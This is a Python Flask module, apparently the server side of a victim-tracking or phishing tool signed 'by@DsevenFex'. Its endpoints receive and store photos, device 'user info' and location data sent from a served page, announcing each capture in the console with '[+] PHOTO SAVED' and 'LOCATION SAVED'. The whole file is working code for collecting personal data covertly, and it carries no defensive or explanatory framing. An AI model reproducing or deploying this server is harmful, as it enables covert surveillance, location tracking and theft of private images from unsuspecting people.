from flask import request, jsonify, render_template
import os
from datetime import datetime
import json
from colorama import Fore, Style, init

init(autoreset=True)

def web(app):
    UPLOAD_FOLDER = 'photos'
    INFO_FOLDER = 'infos'
    LOCATION_FOLDER = "locations"
    ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg'}

    for folder in [UPLOAD_FOLDER, INFO_FOLDER, LOCATION_FOLDER]:
        if not os.path.exists(folder):
            os.makedirs(folder)
    
    def allowed_file(filename):
        return '.' in filename and \
               filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    
    @app.route("/")
    def home():
        return render_template("index1.html")
    
    @app.route('/upload', methods=['POST'])
    def upload_image():
        now_str = datetime.now().strftime('%d.%m.%Y__%H.%M.%S')
        
        if 'image' not in request.files:
            print(f"{Fore.RED}{Style.BRIGHT}[!] Upload error: No image file")
            return jsonify({"message": "by@DsevenFex"}), 400
        
        file = request.files['image']
        if file.filename == '' or not allowed_file(file.filename):
            print(f"{Fore.RED}{Style.BRIGHT}[!] Upload error: Invalid file type")
            return jsonify({"message": "by@DsevenFex"}), 400
        
        filename = f"photo_{now_str}.jpg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)
        
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] PHOTO SAVED: {Fore.CYAN}{filename}")
        return jsonify({"message": "by@DsevenFex", "file": filename})
    
    @app.route('/upload_info', methods=['POST'])
    def upload_info():
        if not request.is_json:
            return jsonify({"message": "by@DsevenFex"}), 400
    
        data = request.get_json()
        now_str = datetime.now().strftime('%d.%m.%Y__%H.%M.%S')
        filename = f"user_{now_str}.json"
        filepath = os.path.join(INFO_FOLDER, filename)
    
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] INFO SAVED: {Fore.WHITE}{Fore.CYAN}{json.dumps(data, ensure_ascii=False)}")
            return jsonify({"message": "by@DsevenFex", "time": now_str, "file": filename})
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[!] Info Save Error: {e}")
            return jsonify({"message": f"by@DsevenFex: {str(e)}"}), 500
    
    @app.route('/upload_location', methods=['POST'])
    def upload_location():
        data = request.get_json()
        now_str = datetime.now().strftime('%d.%m.%Y__%H.%M.%S')
        filename = f"location_{now_str}.json"
        filepath = os.path.join(LOCATION_FOLDER, filename)
    
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] LOCATION SAVED")
            
            return jsonify({"message": "by@DsevenFex"})
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[!] Location Save Error: {e}")
            return jsonify({"message": f"by@DsevenFex: {str(e)}"}), 500